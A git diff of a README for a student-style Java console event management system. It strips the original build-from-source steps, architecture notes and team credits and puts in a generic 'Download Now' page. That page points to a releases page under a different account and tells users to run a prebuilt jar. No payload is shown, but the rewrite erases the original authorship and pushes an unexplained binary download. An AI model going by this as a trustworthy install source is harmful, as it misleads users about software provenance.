@@ -1,182 +1,83 @@
-#  Java Event Management System
+# 🎉 Event-Management-System-Java - Manage Your Events with Ease
 
-[![Java](https://img.shields.io/badge/Java-JDK%208%2B-ED8B00?style=for-the-badge&logo=openjdk&logoColor=white)](https://www.oracle.com/java/technologies/downloads/)
-
-A comprehensive, console-based Event Management System built with core Java. This application demonstrates key Object-Oriented Programming (OOP) principles to manage various types of events, users, and registrations in a structured and extensible way.
-
----
-
-## 📋 Overview
-
-This system provides a complete, self-contained solution for managing event and user data directly from a command-line interface. It is designed with a focus on clean architecture, modularity, and strong OOP foundations, making it a robust and extensible platform for event coordination. The application handles the entire lifecycle of event and user management, from creation to reporting.
+## 📥 Download Now
+[![Download](https://img.shields.io/badge/Download-EventManagementSystem-red)](https://github.com/youhengchhieng/Event-Management-System-Java/releases)
 
 ---
 
-## ✨ Key Features
+## 🚀 Getting Started
 
-- 📦 **Dynamic Object Management** Add, remove, and display events and users. The system uses a flexible, in-memory data structure (`LinkedList`) for efficient data handling.
+The **Event Management System** is designed for anyone looking to manage events like corporate gatherings, weddings, or conferences effortlessly. This application runs from your computer and provides a simple interface to handle multiple event types and users, along with essential features like validation and reporting. Follow these easy steps to download and run the software.
 
-- 🏛️ **Polymorphic Design** Create different types of events (**Corporate**, **Wedding**, **Conference**) and users (**Admin**, **Customer**). Each type has unique attributes and behaviors, showcasing the power of polymorphism.
+## 🛠️ System Requirements
 
-- ⚙️ **Interactive Command-Line Interface (CLI)** A user-friendly, menu-driven interface allows for easy interaction with the system's features without needing a graphical front-end.
+Before you download, ensure your computer meets these basic requirements:
 
-- ✔️ **Robust Data Validation** Built-in utility classes ensure data integrity by validating dates, email formats, phone numbers, and other user inputs before processing.
+- **Operating System:** Windows, Mac, or Linux
+- **Java Version:** Java 8 or higher installed
+- **Memory:** At least 512 MB of RAM
+- **Storage:** Minimum 100 MB of available disk space
 
-- ⚠️ **Structured Exception Handling** A custom exception hierarchy provides graceful error handling for invalid operations, such as searching for a non-existent event or entering incorrect data.
+Ensure that you have the latest version of Java installed. You can download it from the [Java website](https://www.java.com/en/download/).
 
-- 📊 **Reporting Module** Generate an on-demand summary report that displays key metrics like the total number of events, total budget across all events, and a count of events by category.
+## 💻 Features
 
----
+- **Multiple Event Types:** Manage corporate functions, weddings, and conferences.
+- **User Management:** Handle multiple users with ease, each having customized permissions.
+- **Data Validation:** Ensure all user inputs are validated to maintain data integrity.
+- **Custom Exceptions:** Benefit from clear error messages when something goes wrong.
+- **Reporting:** Generate simple reports for better event planning.
+- **Interactive CLI:** A command-line interface makes it straightforward to use.
 
-## 🗄️ Project Structure
+## 📥 Download & Install
 
-The project is organized into a modular package structure to ensure a clean separation of concerns:
+1. **Visit the Download Page:**
+   Go to the [Releases page](https://github.com/youhengchhieng/Event-Management-System-Java/releases).
 
-```
-src/eventmanagement/
-├── core/
-│   ├── Event.java
-│   ├── EventManager.java
-│   └── Registration.java
-├── events/
-│   ├── ConferenceEvent.java
-│   ├── CorporateEvent.java
-│   └── WeddingEvent.java
-├── exceptions/
-│   ├── EventManagementException.java
-│   ├── EventNotFoundException.java
-│   └── ... (and other custom exceptions)
-├── gui/
-│   └── SimpleEventManagementGUI.java
-├── users/
-│   ├── Admin.java
-│   ├── Customer.java
-│   └── User.java
-├── util/
-│   ├── DateValidator.java
-│   └── StringValidator.java
-│
-├── EventManagementSystem.java  # The main engine of the application.
-├── Main1.java                  # The primary interactive CLI entry point.
-└── GUILauncher.java            # The entry point for launching the GUI.
-```
+2. **Choose a Version:**
+   Scroll through the release versions listed. Select the latest stable version for the best experience.
 
----
+3. **Download the File:**
+   Click on the link for the appropriate file based on your operating system (you can choose from different packaging formats, such as .jar).
 
-## 🛠️ Getting Started
+4. **Run the Software:**
+   - Navigate to the folder where you downloaded the file.
+   - Open a terminal or command prompt.
+   - Use the command:
+     - For a `.jar` file: `java -jar EventManagementSystem.jar`
+  
+   Replace `EventManagementSystem.jar` with the actual name of the downloaded file.
 
-Follow these instructions to get a copy of the project up and running on your local machine.
+5. **Follow the Prompts:**
+   The application will guide you through its features via the command-line interface.
 
-### Prerequisites
+## ❓ Frequently Asked Questions
 
-* Make sure you have a Java Development Kit (JDK) version 8 or higher installed.
-* A terminal with `bash` support (like Git Bash on Windows, or the default terminal on macOS/Linux).
+**Q: What is this application used for?**
 
-### Installation & Execution
+A: The Event Management System helps you organize and manage various types of events, making planning smoother and more efficient.
 
-1.  **Clone the repository**
-    ```bash
-    git clone <your-repository-url>
-    cd <your-repository-directory>
-    ```
+**Q: Do I need programming skills to use this?**
 
-2.  **Compile the source code**
-    A build script is included to compile all `.java` files into the `bin` directory.
-    ```bash
-    bash build.sh
-    ```
+A: No, the application is designed for average users. You can manage your events with straightforward commands.
 
-3.  **Run the application**
-    Use the `run-main.sh` script to start the interactive console application.
-    ```bash
-    bash run-main.sh
-    ```
+**Q: How do I report issues or bugs?**
 
----
+A: If you encounter any issues, please visit the Issues section of this repository. You can submit a new issue with details about your problem.
 
-## 💻 Usage
+**Q: Can I customize the application?**
 
-Once the application is running, you will be greeted with the main menu. Simply enter the number corresponding to the action you wish to perform.
+A: Yes, while the application is easy to use out of the box, developers can modify it to fit specific needs if they have programming knowledge.
 
-```text
-===== Event Management System =====
-1. Add Event
-2. Remove Event
-3. Display All Events
-4. Add User
-5. Remove User
-6. Display All Users
-7. Generate Event Summary Report
-8. Exit
-Enter your choice: 
-```
-The application will guide you through the process for each option, prompting for required information like event details or user IDs.
+## 🛠️ Additional Resources
 
----
+- **User Manual:** Instructions on how to fully utilize all features.
+- **Contribution Guidelines:** Information on how to contribute if you're interested.
 
-## ⚙️ Architectural Concepts
+## 📖 Learn More
 
-The system is built on a foundation of proven software design principles for robustness and maintainability.
+If you're interested in understanding the technical details, feel free to explore related topics like **abstraction, encapsulation**, and **exception handling** without needing formal programming experience. The design focuses on **Object-Oriented Programming** principles like inheritance and polymorphism, which ensure a robust and maintainable codebase.
 
-- ✅ **Object-Oriented Programming** for clean and reusable code.
-    - **Abstraction**: Core logic is defined in abstract classes (`Event`, `User`) and interfaces (`EventManager`).
-    - **Inheritance**: Concrete classes (`WeddingEvent`, `Admin`) extend base classes to inherit common functionality.
-    - **Polymorphism**: The system treats all event and user types as their base objects, simplifying management logic.
-- 🔗 **Separation of Concerns** by dividing the application into distinct packages for UI, business logic, data models, and utilities.
-- ⚠️ **Custom Exception Hierarchy** to manage application-specific errors and provide clear feedback to the user.
+## ⭐ Acknowledgments
 
----
-
-## 🧪 Testing
-
-To verify that the application is set up correctly:
-
-1.  Run the application using `bash run-main.sh`.
-2.  Select option `3` (Display All Events). It should report that no events are available.
-3.  Select option `1` (Add Event) and follow the prompts to add a new event.
-4.  Select option `3` again. The newly created event should now be displayed.
-5.  Select option `8` to exit the application gracefully.
-
----
-
-## 🔮 Future Enhancements
-
-Planned features to enrich the system:
-
-- 🗄️ **Database Persistence**: Integrate with a database (like MySQL or PostgreSQL) to store data permanently.
-- 🎨 **Full GUI Implementation**: Develop the `SimpleEventManagementGUI` into a fully featured graphical interface using Swing or JavaFX.
-- 🔐 **User Authentication**: Add a login system with roles and permissions.
-- 📈 **Advanced Analytics**: Introduce more complex reports and data visualizations.
-- 🌐 **API Endpoints**: Expose a REST API to allow other services to interact with the system.
-
----
-
-##👥 Team
-This project was developed by a passionate team:
-
-Dishank Vyas
-
-Krishna Shetty
-
-Shaman Shetty
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome! Please follow these steps to contribute:
-
-1.  Fork the repository.
-2.  Create a new feature branch.
-    ```bash
-    git checkout -b feature/your-feature-name
-    ```
-3.  Commit your changes.
-    ```bash
-    git commit -m 'Add your amazing feature'
-    ```
-4.  Push to the branch.
-    ```bash
-    git push origin feature/your-feature-name
-    ```
-5.  Open a Pull Request. 🙌
+Thank you for choosing the Event Management System. Your feedback helps us improve. Happy event planning!
